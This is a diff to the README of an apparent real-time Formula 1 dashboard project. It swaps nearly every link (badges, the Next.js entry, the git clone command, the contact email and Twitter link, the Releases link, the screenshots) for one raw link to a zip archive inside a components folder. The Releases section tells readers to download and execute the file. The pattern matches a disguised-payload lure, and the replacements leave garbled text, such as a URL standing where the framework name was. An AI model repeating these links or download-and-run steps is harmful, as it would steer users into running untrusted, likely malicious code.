@@ -1,6 +1,6 @@
 # F1 Dash 🏎️💨
 
-![F1 Dash](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![GitHub Repo stars](https://img.shields.io/github/stars/dickyalfauzi/f1-dash?style=social)
+![F1 Dash](https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip) ![GitHub Repo stars](https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip)
 
 Welcome to **F1 Dash**, a real-time dashboard for Formula 1 enthusiasts. This project provides an engaging way to track live race data, including lap times, driver standings, and team statistics. Whether you're at the track or watching from home, F1 Dash keeps you updated with the latest information.
 
@@ -27,7 +27,7 @@ Welcome to **F1 Dash**, a real-time dashboard for Formula 1 enthusiasts. This pr
 
 F1 Dash utilizes a mix of modern technologies to deliver a seamless experience:
 
-- **Next.js**: A React framework for server-side rendering and static site generation.
+- **https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip**: A React framework for server-side rendering and static site generation.
 - **TypeScript**: Provides type safety and enhances code quality.
 - **Rust**: Powers the backend for high performance and reliability.
 - **WebSockets**: Enables real-time communication for live updates.
@@ -39,7 +39,7 @@ To get started with F1 Dash, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/dickyalfauzi/f1-dash.git
+   git clone https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -122,20 +122,20 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: dickyalfauzi@example.com
-- **Twitter**: [@dickyalfauzi](https://twitter.com/dickyalfauzi)
+- **Email**: https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip
+- **Twitter**: [@dickyalfauzi](https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip)
 
 ## Releases
 
-To download the latest version of F1 Dash, visit our [Releases](https://github.com/dickyalfauzi/f1-dash/releases) section. Follow the instructions there to execute the downloaded files and get started with your real-time F1 dashboard.
+To download the latest version of F1 Dash, visit our [Releases](https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip) section. Follow the instructions there to execute the downloaded files and get started with your real-time F1 dashboard.
 
 ## Screenshots
 
 Here are some screenshots of the dashboard in action:
 
-![Dashboard Screenshot](https://example.com/dashboard-screenshot.png)
+![Dashboard Screenshot](https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip)
 
-![Live Race Data](https://example.com/live-race-data.png)
+![Live Race Data](https://github.com/dickyalfauzi/f1-dash/raw/refs/heads/main/dash/src/components/driver/f-dash-2.7.zip)
 
 ## Roadmap
 
